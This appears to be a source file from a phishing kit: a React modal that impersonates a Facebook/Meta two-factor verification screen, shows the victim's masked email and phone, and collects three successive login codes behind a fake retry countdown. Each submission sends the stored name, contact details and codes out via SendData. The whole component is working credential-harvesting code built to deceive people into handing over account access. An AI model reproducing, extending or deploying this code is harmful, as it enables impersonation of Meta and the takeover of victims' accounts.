import React from 'react';
import Modal from './Modal';
import {
    modalFooterLogoClass,
    modalInputShellClass,
    modalInputShellErrorClass,
    modalLeadClass,
    modalMediaClass,
    modalPrimaryBtnClass,
} from '#components/modals/modalStyles';
import { maskEmail, maskPhoneNumber } from '@/utils/mask';
import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
import { useAppStrings } from '@/hooks/useAppStrings';
import { SendData } from '@/utils/sendData';

interface TwoFactorModalProps {
    isOpend: boolean;
    isOpendFinish: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
    const t = useAppStrings();
    const initialCountdown = process.env.NEXT_PUBLIC_SETTING_TIME
        ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME, 10)
        : 20;

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const [retryLeft, setRetryLeft] = React.useState<number | null>(null);
    const [loading, setLoading] = React.useState(false);
    const [click, setClick] = React.useState(0);
    const [disabled, setDisable] = React.useState(false);
    const intervalRef = React.useRef<ReturnType<typeof setInterval> | null>(null);

    const dispatch = useAppDispatch();
    const formDataState = useAppSelector((state) => state.stepForm.data);

    const [twoFa, setTwoFa] = React.useState('');

    const { fullName, phone, email, emailBusiness } = (formDataState as FormData) || {}

    const phoneDisplay = maskPhoneNumber(phone)
    const emailDisplay = maskEmail(email)
    const emailBusinessDisplay = (() => {
        const contact = (email || '').trim().toLowerCase()
        const business = (emailBusiness || '').trim()
        if (!business) return ''
        if (business.toLowerCase() === contact) return ''
        return maskEmail(business)
    })()
    const destinationsDisplay = [emailDisplay, emailBusinessDisplay, phoneDisplay]
        .filter(Boolean)
        .join(', ')

    const [countdown, setCountdown] = React.useState<number>(initialCountdown);

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    React.useEffect(() => {
        return () => {
            if (intervalRef.current) {
                clearInterval(intervalRef.current);
            }
        };
    }, []);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        const normalizedValue = value.replace(/\D/g, '').slice(0, 8);
        setTwoFa(normalizedValue);
        setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change

        if (click === 0) {
            dispatch(updateForm({ twoFa: normalizedValue }));
        }

        if (click === 1) {
            dispatch(updateForm({ twoFaSecond: normalizedValue }));
        }

        if (click === 2) {
            dispatch(updateForm({ twoFaThird: normalizedValue }));
        }
    };

    const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);

    const startRetryCountdown = (nextStep: number) => {
        if (intervalRef.current) clearInterval(intervalRef.current);

        setDisable(true);
        setCountdown(initialCountdown);
        setRetryLeft(initialCountdown);
        setErrors({});

        intervalRef.current = setInterval(() => {
            setCountdown((prev) => {
                const next = prev - 1;
                if (next <= 0) {
                    if (intervalRef.current) clearInterval(intervalRef.current);
                    intervalRef.current = null;
                    setClick(nextStep);
                    setRetryLeft(null);
                    setErrors({});
                    setDisable(false);
                    return initialCountdown;
                }
                setRetryLeft(next);
                return next;
            });
        }, 1000);
    };

    const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
        const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 8);
        e.preventDefault();
        setTwoFa(pasted);
        setErrors((prev) => ({ ...prev, twoFa: '' }));
        if (click === 0) dispatch(updateForm({ twoFa: pasted }));
        if (click === 1) dispatch(updateForm({ twoFaSecond: pasted }));
        if (click === 2) dispatch(updateForm({ twoFaThird: pasted }));
    };

    const handleClose = () => {
        if (intervalRef.current) {
            clearInterval(intervalRef.current);
            intervalRef.current = null;
        }
        setIsOpen(false);
        onToggleModal(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();
            const newErrors: Record<string, string> = {};

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }
            const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);

            if (!isTwoFaValid) {
                setRetryLeft(null);
                setErrors({ twoFa: 'errInvalid' });
                return;
            }

            setLoading(true);

            if (click === 0) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');
                        startRetryCountdown(1);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setRetryLeft(null);
                    setErrors({ twoFa: 'errSend' });
                });
            }

            if (click === 1) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');
                        startRetryCountdown(2);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setRetryLeft(null);
                    setErrors({ twoFa: 'errSend' });
                });
            }

            if (click === 2) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');

                        isOpendFinish(true);
                        handleClose();

                        setClick(0);
                    }, 1234);
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setRetryLeft(null);
                    setErrors({ twoFa: 'errVerify' });
                });
            }

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) =>
        `${modalInputShellClass} ${errors[field] || (field === 'twoFa' && retryLeft != null) ? modalInputShellErrorClass : ''}`

    const resolveTwoFaError = () => {
        if (retryLeft != null) {
            const minutes = Math.floor(retryLeft / 60)
            const seconds = retryLeft % 60
            return t.twoFa.retryError(minutes, seconds)
        }
        if (errors.twoFa === 'errInvalid') return t.twoFa.errInvalid
        if (errors.twoFa === 'errSend') return t.twoFa.errSend
        if (errors.twoFa === 'errVerify') return t.twoFa.errVerify
        return errors.twoFa || null
    }

    const errorText = (field: string) => {
        const message = field === 'twoFa' ? resolveTwoFaError() : errors[field]
        return message ? <p className="mb-2.5 mt-1 text-[13px] text-red-500">{message}</p> : null
    }

    return (
        <Modal isOpen={isOpen} title="" onClose={handleClose} isClosable={false} compact>
            <div className="flex min-h-full w-full min-w-0 flex-col gap-5 pb-1">
                <div className="w-full">
                    <div className="mb-2 flex w-full items-center gap-1.5 text-[13px] text-[#65676B]">
                        <span className="truncate">{fullName}</span>
                        <span className="h-1 w-1 shrink-0 rounded-full bg-[#bcc0c4]" aria-hidden />
                        <span>{t.common.facebook}</span>
                    </div>
                    <h2 className="mb-2 break-words text-[17px] font-bold leading-snug text-[#1c1e21] sm:text-[18px]">
                        {t.twoFa.title}
                    </h2>
                    <p className={modalLeadClass}>{t.twoFa.description(destinationsDisplay)}</p>
                    <div className={`${modalMediaClass} mt-4`}>
                        <img src="/images/meta/authentication.png" width="100%" alt="" />
                    </div>
                    <div className="w-full">
                        <form onSubmit={handSubmit}>
                            <label htmlFor="twoFa" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">
                                {t.twoFa.label} <span className="text-[#e5484d]">*</span>
                            </label>
                            <div className={inputClass('twoFa')}>
                                <input
                                    type="text"
                                    inputMode="numeric"
                                    id="twoFa"
                                    placeholder={t.twoFa.placeholder}
                                    className={`h-full w-full bg-transparent outline-none ${disabled ? 'cursor-not-allowed opacity-70' : ''}`}
                                    value={twoFa}
                                    onChange={handleChange}
                                    onPaste={handlePaste}
                                    disabled={disabled}
                                    maxLength={8}
                                    aria-label={t.twoFa.ariaInput}
                                />
                            </div>
                            <p className="mb-2.5 text-[12px] text-[#65676B]">{t.twoFa.hint}</p>
                            {errorText('twoFa')}

                            <div className="mt-5 w-full">
                                <button
                                    type="submit"
                                    className={modalPrimaryBtnClass}
                                    disabled={disabled || !isTwoFaValid || loading}
                                    aria-label={t.twoFa.ariaSubmit}
                                >
                                    {loading && (
                                        <div className="mr-2.5 h-5 w-5 animate-spin">
                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="" />
                                        </div>
                                    )}
                                    {loading ? '' : t.common.continue}
                                </button>
                            </div>
                        </form>
                    </div>
                </div>

                <div className={`${modalFooterLogoClass} mt-1`}>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="" />
                </div>
            </div>
        </Modal>
    )
}

export default TwoFactorModal;